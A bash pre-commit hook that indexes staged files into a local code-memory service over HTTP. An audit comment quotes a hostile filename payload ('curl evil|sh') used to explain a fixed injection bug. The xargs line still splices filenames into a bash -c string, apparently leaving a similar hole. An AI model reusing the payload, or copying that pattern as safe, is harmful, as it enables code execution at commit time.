#!/usr/bin/env bash
# Pre-commit hook: auto-ingest staged source files into agent-memory-lite.
#
# Why: keeps the code-memory index in sync with what is being committed,
# so memory_file_digest / memory_symbol_history / memory_breaking_changes
# always reflect HEAD. Closes the adoption gap where agents fall back to
# Read/Grep because the index is stale.
#
# Behaviour: for every staged file matching the indexed extensions
# (.py, .ts, .tsx, .js, .jsx, .md, .yaml, .yml, .sql, .sh), POST the
# content to the local HTTP service at $MEMORY_SERVICE_URL (default
# http://127.0.0.1:8765) /memory/ingest_file with workspace_id =
# $MEMORY_WORKSPACE_ID (required env). Idempotent via content_hash.
#
# Failure policy: NEVER block the commit. If the service is unreachable
# or the workspace_id is missing, print a notice and exit 0 — the index
# will simply stay stale until the next successful run. The commit is
# the operator's intent; we just opportunistically index.
#
# Bypass: MEMORY_SKIP_PRECOMMIT_INGEST=1 git commit ...

set -u  # NOT -e: a single ingest failure must not block the commit.

if [[ "${MEMORY_SKIP_PRECOMMIT_INGEST:-0}" == "1" ]]; then
    echo "[memory-ingest] skipped via MEMORY_SKIP_PRECOMMIT_INGEST=1"
    exit 0
fi

WORKSPACE_ID="${MEMORY_WORKSPACE_ID:-}"
if [[ -z "$WORKSPACE_ID" ]]; then
    echo "[memory-ingest] MEMORY_WORKSPACE_ID not set — skipping pre-commit ingest" >&2
    exit 0
fi

SERVICE_URL="${MEMORY_SERVICE_URL:-http://127.0.0.1:8765}"
INDEXED_EXTS="py|ts|tsx|js|jsx|md|yaml|yml|sql|sh"

# Reachability probe (15 s — /health can take 4+ s on cold-start; service
# may be busy serving an MCP request. We allow up to 15 s before giving up).
if ! curl -sfm 15 "$SERVICE_URL/health" > /dev/null 2>&1; then
    echo "[memory-ingest] service at $SERVICE_URL unreachable — skipping" >&2
    exit 0
fi

# Collect staged files (added/copied/modified), filter by extension.
# Skip deletions: `git diff --diff-filter=ACM`.
mapfile -t STAGED < <(git diff --cached --name-only --diff-filter=ACM | grep -E "\.($INDEXED_EXTS)\$" || true)

if [[ ${#STAGED[@]} -eq 0 ]]; then
    exit 0
fi

echo "[memory-ingest] indexing ${#STAGED[@]} staged file(s) into workspace=$WORKSPACE_ID"

# Total wall-clock ceiling. The hook must never block a commit for more
# than a couple of minutes — if it does, the operator's workflow is
# meaningfully degraded. Files that don't get indexed in time stay
# stale until the next normal commit (they'll be picked up there since
# the hook is content-hash idempotent).
MAX_TOTAL_SECONDS="${MEMORY_PRECOMMIT_TIMEOUT:-120}"
# Per-file curl timeout. Cold-path embedding of a 30 KB markdown takes
# 20-40 s; warm-path is sub-100 ms. 45 s is a safe single-file ceiling
# when running in parallel.
PER_FILE_TIMEOUT="${MEMORY_PRECOMMIT_PER_FILE_TIMEOUT:-45}"
# Concurrency. The HTTP service holds a single SQLite write lock, but
# embedding is CPU-bound and parallelizes well — 6 simultaneous curls
# saturate the embedding worker pool without thrashing.
PARALLEL="${MEMORY_PRECOMMIT_PARALLEL:-6}"

LANG_FOR_EXT() {
    case "$1" in
        py)        echo "python" ;;
        ts|tsx)    echo "typescript" ;;
        js|jsx)    echo "javascript" ;;
        md)        echo "markdown" ;;
        yaml|yml)  echo "yaml" ;;
        sql)       echo "sql" ;;
        sh)        echo "bash" ;;
        *)         echo "text" ;;
    esac
}

# Workspace for the worker subshell. Exported so child bash inherits.
export WORKSPACE_ID
export SERVICE_URL
export PER_FILE_TIMEOUT

# Worker: ingest ONE file. Prints "indexed" / "skipped" / "failed" on
# stdout so the parent can count outcomes.
ingest_one() {
    local path="$1"
    if [[ ! -f "$path" ]]; then
        echo failed
        return
    fi
    local ext="${path##*.}"
    local lang
    lang=$(LANG_FOR_EXT "$ext")
    local payload
    if command -v jq > /dev/null 2>&1; then
        payload=$(jq -n --arg ws "$WORKSPACE_ID" --arg p "$path" --arg lang "$lang" \
            --rawfile c "$path" \
            '{workspace_id: $ws, path: $p, content: $c, language: $lang}')
    else
        # Round-2 audit (HIGH): the jq-absent fallback used to splice
        # $path / $WORKSPACE_ID / $lang straight into a `python -c`
        # source string. A staged file named e.g.
        #   '; __import__('os').system('curl evil|sh'); '.py
        # broke out of the literal and ran arbitrary code at commit
        # time — RCE triggered by `git commit` on a repo containing a
        # hostile filename. Fixed: pass the values as argv via a
        # single-quoted heredoc (bash does NOT expand $ inside), so
        # the Python source is fully static and the path is data.
        payload=$(python - "$WORKSPACE_ID" "$path" "$lang" <<'PYEOF' 2>/dev/null || true
import json
import pathlib
import sys

ws, path, lang = sys.argv[1], sys.argv[2], sys.argv[3]
print(
    json.dumps(
        {
            "workspace_id": ws,
            "path": path,
            "content": pathlib.Path(path).read_text(encoding="utf-8"),
            "language": lang,
        }
    )
)
PYEOF
)
    fi
    if [[ -z "$payload" ]]; then
        echo failed
        return
    fi
    local response
    response=$(printf '%s' "$payload" | curl -sfm "$PER_FILE_TIMEOUT" -X POST \
        "$SERVICE_URL/memory/ingest_file" \
        -H "Content-Type: application/json" \
        --data-binary @- 2>/dev/null || true)
    if [[ -z "$response" ]]; then
        echo failed
        return
    fi
    if echo "$response" | grep -q '"skipped":true'; then
        echo skipped
    else
        echo indexed
    fi
}
export -f ingest_one LANG_FOR_EXT

# Parallel fan-out via xargs -P. Each worker prints exactly one line:
# "indexed" / "skipped" / "failed". The whole pipeline is wrapped in
# `timeout` so the hook can never exceed $MAX_TOTAL_SECONDS regardless
# of how many cold-path embeddings stack up.
results_file=$(mktemp)
trap 'rm -f "$results_file"' EXIT

printf '%s\n' "${STAGED[@]}" | \
    timeout --preserve-status "$MAX_TOTAL_SECONDS" \
    xargs -P "$PARALLEL" -I {} bash -c 'ingest_one "{}"' > "$results_file" 2>/dev/null || true

# grep -c prints "0" with exit code 1 on zero matches; the previous
# ``|| echo 0`` then appended a SECOND "0" → variable held "0\n0" and
# the arithmetic below failed with "syntax error in expression". Use
# `true` to swallow the exit code without appending output, then
# default-empty to 0 so a missing results_file (timeout = no writes)
# still arithmetics cleanly.
INGESTED=$(grep -c '^indexed$' "$results_file" 2>/dev/null || true)
SKIPPED=$(grep -c '^skipped$' "$results_file" 2>/dev/null || true)
FAILED=$(grep -c '^failed$' "$results_file" 2>/dev/null || true)
INGESTED=${INGESTED:-0}
SKIPPED=${SKIPPED:-0}
FAILED=${FAILED:-0}
COUNTED=$((INGESTED + SKIPPED + FAILED))
TIMED_OUT=$((${#STAGED[@]} - COUNTED))

if [[ $TIMED_OUT -gt 0 ]]; then
    echo "[memory-ingest] indexed=$INGESTED skipped=$SKIPPED failed=$FAILED timed_out=$TIMED_OUT (hook ceiling=${MAX_TOTAL_SECONDS}s)"
else
    echo "[memory-ingest] indexed=$INGESTED skipped=$SKIPPED failed=$FAILED"
fi
exit 0
